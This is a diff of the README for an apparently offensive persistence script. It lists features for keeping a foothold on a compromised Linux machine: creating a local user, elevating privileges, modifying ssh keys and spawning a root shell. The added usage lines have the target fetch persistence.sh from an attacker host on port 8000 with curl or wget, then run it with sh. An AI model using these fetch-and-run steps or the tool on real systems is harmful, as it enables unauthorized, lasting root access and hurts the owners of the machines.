@@ -6,10 +6,10 @@ With this script it is possible to apply some persistence techniques to get a fo
 
 ## Features
 
-- Elevate privileges
-- Create a root shell
-- Modify ssh keys
 - Create local user
+- Elevate privileges
+- Modify ssh keys
+- Create a root shell
 
 ## Usage
 
@@ -23,7 +23,9 @@ Local network:
 # Host:
 sh persistence.sh -w
 # Target:
-curl -LJO <Host>:8000/persistence.sh
+curl -LJO <Host>:8000/persistence.sh #or
+curl <Host>:8000/persistence.sh > persistence.sh #or
+wget <Host>:8000/persistence.sh
 sh persistence.sh -h
 ```
 
